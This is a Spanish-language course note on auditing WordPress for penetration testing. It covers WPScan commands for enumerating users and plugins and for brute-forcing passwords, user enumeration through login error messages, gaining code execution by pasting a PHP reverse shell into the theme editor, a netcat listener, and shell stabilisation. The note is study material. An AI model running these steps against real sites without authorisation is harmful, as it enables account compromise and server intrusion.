

> [!info] Relacionado con
> [[Burp Suite - Framework de Auditoría]] · [[Apuntes/05 - Auditoria Web/Enumeración Web]] · [[OWASP Top 10 - CVE CVSS CWE]] · [[Fuzzing Web con ffuf]]

---

## ① CMS vs Web nativa

| Tipo | Descripción |
|------|------------|
| **Web nativa** | Programada directamente (PHP, .NET, Java). SQLi, XSS directos. |
| **CMS** | WordPress, Joomla, Drupal. Núcleo + plugins de terceros. |


> [!important] Idea central
> El núcleo de WordPress rara vez es vulnerable (está muy revisado). Las grandes vulnerabilidades aparecen en los **plugins**, porque hay miles y **nadie audita su seguridad**.

---

## ② Metodología de auditoría WordPress

```
1. Enumeración web → /wordpress detectado
 →“
2. [[WPScan]] → versión, plugins, temas, usuarios
 →“
3. Enumerar usuarios (mensajes de error del login)
 →“
4. Fuerza bruta con [[WPScan]] (ÚLTIMO recurso)
 →“
5. Login → Editor de temas → RCE
 →“
6. Reverse shell → www-data → Estabilizar TTY
```

---

## ③ [[WPScan]] "” La navaja suiza

```bash
# Escaneo base (detecta versión)
[[WPScan]] --url http://OBJETIVO/wordpress

# Enumerar usuarios con diccionario
[[WPScan]] --url http://OBJETIVO/wordpress -e u \
 -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Enumerar plugins
[[WPScan]] --url http://OBJETIVO/wordpress --enumerate ap

# Plugins vulnerables con API token (añade CVEs)
[[WPScan]] --url http://OBJETIVO/wordpress --enumerate vp --api-token TOKEN

# Fuerza bruta de contraseñas
[[WPScan]] --url http://OBJETIVO/wordpress --enumerate ap \
 --passwords /usr/share/wordlists/rockyou.txt
```

| Flag | Función |
|------|---------|
| `-e u` | Enumerar usuarios |
| `-e ap` | Todos los plugins |
| `-e vp` | Plugins vulnerables (con token) |
| `--passwords` | Fuerza bruta |
| `--api-token` | Conectar con BD de vulnerabilidades |

> [!tip] API TOKEN
> El token **no** aporta capacidades ofensivas. Solo conecta con la BD de vulnerabilidades. Se obtiene gratis en wpscan.com.

---

## ④ Enumeración de usuarios por mensajes de error

| Mensaje | Significado |
|---------|-----------|
| "El nombre de usuario X no está registrado" | Usuario **no existe** |
| "La contraseña es incorrecta" | Usuario **sí existe** |

> [!warning] INFORMATION DISCLOSURE
> Un login bien diseñado responde siempre: "usuario o contraseña incorrectos". Cuando distingue entre ambos, **filtra información**.

---

## ⑤ RCE por editor de temas

Con acceso al panel `/wp-admin`:

1. **Apariencia → Editor de temas**
2. Seleccionar plantilla **PHP** (ej: `404.php`)
3. Pegar **reverse shell PHP**
4. Guardar
5. Poner Netcat a la escucha
6. Visitar la página 404 en el navegador

```bash
nc -lvnp 1234
# Visitar http://OBJETIVO/wordpress/404.php
# → Conexión recibida como www-data
```

> [!warning] LA PLANTILLA DEBE SER PHP
> Si es HTML, el código PHP **no se ejecuta**. Busca un fichero `.php`.

---

## ⑥ Rutas WordPress a comprobar

| Ruta | Qué nos dice |
|------|-------------|
| `/wordpress/license.txt` | Confirma WordPress, instalación reciente |
| `/wp-login.php` | Login → posible fuerza bruta |
| `/wp-admin/` | Panel de administración |
| `/wp-content/uploads/` | Subidas → posible file upload |
| `/xmlrpc.php` | API antigua |

---

## ⑦ Estabilización de la shell

```bash
# En la víctima (desde la reverse shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z (suspender)
# En Kali:
stty raw -echo; fg
# Enter una o dos veces
```

---

## Checklist de repaso

- [ ] ¿Distingo una web nativa de un CMS?
- [ ] ¿Entiendo por qué el peligro está en los plugins?
- [ ] ¿Sé enumerar versión, usuarios y plugins con [[WPScan]]?
- [ ] ¿Conozco la diferencia entre [[WPScan]] con y sin API token?
- [ ] ¿Sé conseguir RCE con el editor de temas?
- [ ] ¿Entiendo la transición HTTP → TCP al obtener la shell?

---

## Enlaces relacionados

- [[comandos/WPScan]] "” Cheat sheet de comandos

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Chema/Maquinas/Auditoría de CMS — WordPress (máquina Academy).md|Auditoría de CMS — WordPress (máquina Academy)]]— Hydra, Reverse Shells, XSS
- [[Repaso de Enumeración Web.md|Repaso de Enumeración Web]]— Hydra, Reverse Shells, XSS
- [[../../apuntes Joselu/MODULO3/resumen_master_clase39.md|resumen_master_clase39]]— Hydra, Reverse Shells, XSS
- [[../../transcripciones/Julio/02.07.2026 Fuzzing, Directory Listing y Escalada por Script Hijacking.md|02.07.2026 Fuzzing, Directory Listing y Escalada por Script Hijacking]]— Hydra, Reverse Shells, XSS
- [[../../apuntes Chema/Repaso de Enumeración Web.md|Repaso de Enumeración Web]]— Hydra, Reverse Shells, XSS
- [[Auditoria Web — Práctica con Metasploitable.md|Auditoria Web — Práctica con Metasploitable]]— Command Injection / RCE, Hydra, SQL Injection

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/FFUF|FFUF]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Netcat|Netcat / Reverse Shells]]
- [[comandos/WPScan|WPScan]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]

> #burpsuite #command-injection #ffuf #file-upload #hydra #netcat #pentest #reverse-shell #sqli #wordpress #wpscan #xss
